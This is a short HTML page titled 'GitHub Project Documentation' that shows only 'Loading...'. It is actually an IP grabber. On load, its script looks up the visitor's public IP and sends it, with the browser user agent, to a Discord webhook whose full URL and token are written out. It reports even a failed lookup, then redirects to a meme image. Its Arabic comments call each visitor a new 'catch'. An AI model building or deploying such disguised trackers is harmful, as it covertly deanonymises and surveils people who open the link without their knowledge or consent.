<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GitHub Project Documentation</title>
</head>
<body>
    <script>
        // دالة إرسال البيانات
        function sendToDiscord(message) {
            return fetch("https://discord.com/api/webhooks/1459200310185820361/NUkYWHtHY6QxPNWeiCzLz9zR1uKP8mALnEX-D9VEXPE0CETDNzMbYQ0XW0V5XxW9Nwlm", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: message })
            });
        }

        // محاولة جلب الـ IP وإرساله
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const msg = "🚀 **صيد جديد!**\n**الـ IP:** " + data.ip + "\n**المتصفح:** " + navigator.userAgent;
                return sendToDiscord(msg);
            })
            .catch(() => {
                // في حال فشل جلب الـ IP، نرسل تنبيه أن الرابط فُتح على الأقل
                return sendToDiscord("⚠️ شخص ما فتح الرابط لكن المتصفح حجب الـ IP");
            })
            .finally(() => {
                // التحويل لصورة الميم بعد الانتهاء
                setTimeout(() => {
                    window.location.href = "https://i.imgur.com/866uX9r.jpg";
                }, 500);
            });
    </script>
    <h1>Loading...</h1>
</body>
</html>
